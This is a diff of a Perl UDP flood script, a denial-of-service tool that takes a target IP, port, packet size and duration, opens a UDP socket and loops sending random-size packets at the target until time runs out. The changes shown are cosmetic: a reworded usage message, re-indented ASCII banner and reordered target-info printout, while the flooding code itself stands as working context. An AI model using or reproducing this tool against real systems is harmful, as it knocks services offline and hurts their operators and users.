@@ -14,32 +14,28 @@ my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$psize,$pport);
 
-$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$iaddr = inet_aton("$ip") or die "Such As 192.168.l.l 80 9999 120$ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print BOLD RED<<EOTEXT;
-
-  __  __ _____   __   __  __ _____   __
- |  \/  |_ _\ \ / /__|  \/  |_ _\ \ / /
- | |\/| || | \ V /___| |\/| || | \ V / 
- |_|  |_|___| |_|    |_|  |_|___| |_|  
-                                       	  
-
-
-
+            __  __ _____   __   __  __ _____   __
+           |  \/  |_ _\ \ / /__|  \/  |_ _\ \ / /
+           | |\/| || | \ V /___| |\/| || | \ V / 
+           |_|  |_|___| |_|    |_|  |_|___| |_|  
+                                       
 EOTEXT
 print BOLD WHITE<<EOTEXT;
                     =================
                     =  Targets Info =
                     =================
-                Ip Address = $ip
+                    Ip Address = $ip
                 
-		Port = $port
+		    Port = $port
                 
-		Time = $time
+		    Package = $size
                 
-		Package = $size
+		    Time = $time
 EOTEXT
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
